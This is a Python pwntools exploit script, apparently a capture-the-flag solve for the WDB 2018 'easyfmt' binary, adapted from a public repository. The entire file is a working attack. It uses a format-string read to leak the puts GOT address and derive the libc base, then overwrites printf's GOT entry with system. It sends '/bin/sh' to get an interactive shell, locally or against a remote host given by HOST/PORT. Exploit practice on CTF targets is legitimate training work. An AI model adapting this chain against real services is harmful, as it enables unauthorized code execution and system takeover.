#!/usr/bin/env python3
"""WDB 2018 easyfmt; public solve adapted to local-first, safe defaults.
Reference: https://github.com/Yeuoly/buuctf_pwn/tree/master/wdb_2018_2nd_easyfmt
Requires the matching i386 libc 2.23 via LIBC=/path/to/libc.so.6.
"""
from pathlib import Path
from pwn import *

HERE = Path(__file__).resolve().parent
context.arch = "i386"
elf = ELF(str(HERE / "easyfmt"), checksec=False)
libc_path = args.LIBC or str(HERE / "libc.so.6")
if not Path(libc_path).is_file():
    raise SystemExit("Provide matching i386 libc with LIBC=/path/to/libc.so.6")
libc = ELF(libc_path, checksec=False)
io = remote(args.HOST, int(args.PORT)) if args.REMOTE else process(str(elf.path))

payload = p32(elf.got["puts"]) + b"%6$s"
io.sendafter(b"\n", payload)
leak = io.recvn(8)[4:8]
puts_addr = u32(leak)
libc_base = puts_addr - libc.sym["puts"]
system = libc_base + libc.sym["system"]
log.info("libc base: %#x", libc_base)
payload = fmtstr_payload(6, {elf.got["printf"]: system}, write_size="byte")
io.sendafter(b"\n", payload)
io.sendlineafter(b"\n", b"/bin/sh")
io.interactive()
